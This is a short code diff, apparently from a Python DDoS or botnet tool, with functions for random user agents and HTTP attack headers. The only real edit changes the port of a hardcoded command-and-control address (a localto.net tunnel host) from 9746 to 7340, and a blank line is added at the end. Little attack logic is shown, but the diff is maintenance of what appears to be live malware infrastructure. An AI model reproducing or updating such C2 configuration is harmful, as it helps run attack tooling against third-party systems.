@@ -192,7 +192,7 @@ def rand_ua(mode):
     return ua
 
 C2_ADDRESS  = "nlzpsjlvr.localto.net"
-C2_PORT     = 9746
+C2_PORT     = 7340
 
 def header_http(host,type_attack,mode_type,ver):
     if mode_type == "PYF":
@@ -895,4 +895,5 @@ if __name__ == '__main__':
         main()
     except:
         pass
+
 
